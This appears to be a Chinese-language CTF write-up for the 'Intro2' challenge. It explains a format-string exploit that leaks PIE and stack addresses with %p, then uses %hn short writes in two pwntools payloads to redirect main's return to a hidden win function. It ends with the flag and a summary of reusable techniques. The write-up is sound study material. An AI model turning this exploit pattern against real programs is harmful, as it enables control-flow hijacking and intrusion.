# Intro2

## 题目简述

程序反复读取候选 flag，并把用户输入直接作为格式字符串输出。二进制中保留了一个 `win` 函数；目标是利用格式化字符串先泄露 PIE 与栈地址，再用 `%hn` 改写当前 `main` 栈帧的返回地址，使函数返回到 `win`。

## 解题过程

先用位置参数枚举栈槽。官方解题脚本在远程环境中确定：

- `%39$p` 泄露 `main` 内的代码地址；`win = leak - 0x8c`。
- `%37$p` 泄露与当前栈帧稳定相关的地址；返回地址槽位为 `leak2 - 288`。
- 用户追加在格式字符串末尾的目标地址可由相应的位置参数访问。

为了避免一次打印过多字符，将 64 位 `win` 地址拆成 16 位片段，并使用 `%hn` 分段写入返回地址。低 32 位在第一轮写入：

```python
low = win & 0xffff
high = (win >> 16) & 0xffff
delta = (high - low) & 0xffff

payload = flat(
    f"%4${low}c".encode(), b"%24$hn",
    f"%4${delta}c".encode(), b"%25$hn",
)
payload += b"A" * (-len(payload) % 8)
payload += p64(ret_slot) + p64(ret_slot + 2)
p.sendlineafter(b": ", payload)
```

再对 `ret_slot + 4` 写入地址的第三个 16 位片段：

```python
upper = (win >> 32) & 0xffff
payload = f"%4${upper}c%22$hn".encode()
payload += b"A" * (-len(payload) % 8)
payload += p64(ret_slot + 4)
p.sendlineafter(b": ", payload)
```

最后提交一次普通输入，使 `main` 走到返回路径；被改写的返回地址跳转到 `win`，得到：

```text
byuctf{%p_yourself}
```

## 方法总结

- 核心技巧：格式化字符串的地址泄露与 `%hn` 任意短写组合，将 PIE 下的栈返回地址改成 `win`。
- 识别信号：用户输入直接进入 `printf`、程序可重复交互且存在隐藏成功函数时，应先枚举 `%n$p` 栈槽。
- 复用要点：远程与本地的栈槽编号和偏移可能不同，必须以实际泄露校准；分段写入时按模 $2^{16}$ 计算增量，并保证追加地址按 8 字节对齐。
